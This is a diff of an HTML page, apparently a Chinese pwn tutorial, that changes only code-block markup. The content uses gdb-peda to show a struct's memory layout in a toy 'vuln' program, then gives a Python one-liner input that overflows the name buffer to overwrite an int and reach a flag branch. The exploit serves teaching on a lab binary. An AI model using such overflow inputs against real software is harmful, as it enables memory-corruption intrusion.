@@ -117,9 +117,8 @@ int main(int argc, char **argv) {
 
 <h2 id="gdb调试指令">GDB调试指令</h2>
 
-<div class="highlighter-rouge"><pre class="highlight"><code>gdb ./vuln
-</code></pre>
-</div>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>gdb ./vuln
+</code></pre></div></div>
 
 <p>如果成功安装了peda，就可以看到 <code class="highlighter-rouge">gdb-peda$</code> 的提示了。</p>
 
@@ -131,14 +130,13 @@ int main(int argc, char **argv) {
 
 <p><code class="highlighter-rouge">r</code> 指令是运行这个调试程序，然后看到进程成功的停在了我们的断点处。</p>
 
-<div class="highlighter-rouge"><pre class="highlight"><code>gdb-peda$ r
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>gdb-peda$ r
 
 ...
 
 Breakpoint 1, main (argc=0x1, argv=0x7fffffffe568) at main.c:14
 14	    printf("What's Your Birth?\n");
-</code></pre>
-</div>
+</code></pre></div></div>
 
 <p>至于下面的一堆汇编输出，我们后面再说。</p>
 
@@ -146,7 +144,7 @@ Breakpoint 1, main (argc=0x1, argv=0x7fffffffe568) at main.c:14
 
 <p>下断点就是为了查看 <code class="highlighter-rouge">student</code> 结构体的内存分布，C 语言里面很多函数在这里也是类似的用法的。</p>
 
-<div class="highlighter-rouge"><pre class="highlight"><code>gdb-peda$ p sizeof(student)
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>gdb-peda$ p sizeof(student)
 $1 = 0x48
 gdb-peda$ p sizeof(student.birth)
 $2 = 0x4
@@ -163,8 +161,7 @@ gdb-peda$ p &amp;(student.s)
 $7 = 0x7fffffffe330 "c\344\377\377\205\a"
 gdb-peda$ p &amp;(student.birth)
 $8 = (int *) 0x7fffffffe334
-</code></pre>
-</div>
+</code></pre></div></div>
 
 <p>可以看到 <code class="highlighter-rouge">student</code> 结构体是 72 个字节大小，<code class="highlighter-rouge">student</code> 结构体和 <code class="highlighter-rouge">student.name</code> 起始内存地址都是 <code class="highlighter-rouge">0x7fffffffe2f0</code>，因为在内存中本来就没有结构体这种东西。</p>
 
@@ -184,7 +181,7 @@ $8 = (int *) 0x7fffffffe334
 
 <p>为了打印 <code class="highlighter-rouge">student</code> 结构体的内存分布，先在第 21 行下断点，然后让进程继续执行直到下一个断点。</p>
 
-<div class="highlighter-rouge"><pre class="highlight"><code>gdb-peda$ b 21
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>gdb-peda$ b 21
 Breakpoint 2 at 0x40079d: file main.c, line 21.
 gdb-peda$ c
 Continuing.
@@ -197,12 +194,11 @@ Legend: code, data, rodata, value
 
 Breakpoint 2, main (argc=0x1, argv=0x7fffffffe428) at main.c:21
 21	    printf("You Are Born In %d\n", student.birth);
-</code></pre>
-</div>
+</code></pre></div></div>
 
 <p>然后就可以</p>
 
-<div class="highlighter-rouge"><pre class="highlight"><code>gdb-peda$ x/72xb &amp;student
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>gdb-peda$ x/72xb &amp;student
 0x7fffffffe2f0:	0x41	0x41	0x41	0x41	0x41	0x41	0x41	0x41
 0x7fffffffe2f8:	0x41	0x41	0x41	0x41	0x41	0x41	0x41	0x41
 0x7fffffffe300:	0x41	0x41	0x41	0x41	0x41	0x41	0x41	0x41
@@ -212,8 +208,7 @@ Breakpoint 2, main (argc=0x1, argv=0x7fffffffe428) at main.c:21
 0x7fffffffe320:	0x41	0x41	0x41	0x41	0x41	0x41	0x41	0x41
 0x7fffffffe328:	0x41	0x41	0x41	0x41	0x41	0x41	0x41	0x00
 0x7fffffffe330:	0x63	0xe4	0xff	0xff	0x85	0x07	0x00	0x00
-</code></pre>
-</div>
+</code></pre></div></div>
 
 <p>前 64 个字节就是字母 <code class="highlighter-rouge">A</code> 的 ASCII <code class="highlighter-rouge">0x41</code>，然后是 <code class="highlighter-rouge">0x00</code> 字符串结尾，然后是代码中写死的 <code class="highlighter-rouge">c</code> 字母 <code class="highlighter-rouge">0x63</code>，然后跳过三个字节之后还剩四个字节，就是一个 <code class="highlighter-rouge">int</code> 数字。</p>
 
@@ -227,19 +222,18 @@ Breakpoint 2, main (argc=0x1, argv=0x7fffffffe428) at main.c:21
 
 <p>然后这种特殊的字符我们都可以使用 Python 输入到文件中，然后重定向输入的</p>
 
-<div class="highlighter-rouge"><pre class="highlight"><code>➜  Desktop python -c "print '1234\n' + 'A' * 68 + '\x86\x07\n'" &gt; 1.in
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  Desktop python -c "print '1234\n' + 'A' * 68 + '\x86\x07\n'" &gt; 1.in
 ➜  Desktop ./vuln &lt; 1.in
 What's Your Birth?
 What's Your Name?
 You Are Born In 1926
 You Shall Have Flag.
 THIS_IS_FLAG
-</code></pre>
-</div>
+</code></pre></div></div>
 
 <p>GDB 也可以使用这种重定向输入的</p>
 
-<div class="highlighter-rouge"><pre class="highlight"><code>gdb-peda$ b 21
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>gdb-peda$ b 21
 Breakpoint 1 at 0x40079d: file main.c, line 21.
 gdb-peda$ r &lt; 1.in
 Starting program: /home/virusdefender/Desktop/pwn/new/vuln &lt; 1.in
@@ -260,8 +254,7 @@ gdb-peda$ x/72xb &amp;student
 0x7fffffffe320:	0x41	0x41	0x41	0x41	0x41	0x41	0x41	0x41
 0x7fffffffe328:	0x41	0x41	0x41	0x41	0x41	0x41	0x41	0x41
 0x7fffffffe330:	0x41	0x41	0x41	0x41	0x86	0x07	0x00	0x00
-</code></pre>
-</div>
+</code></pre></div></div>
 
 <p>可以看到我们控制了 <code class="highlighter-rouge">student</code> 的内存，让代码进入了指定的分支。</p>
 
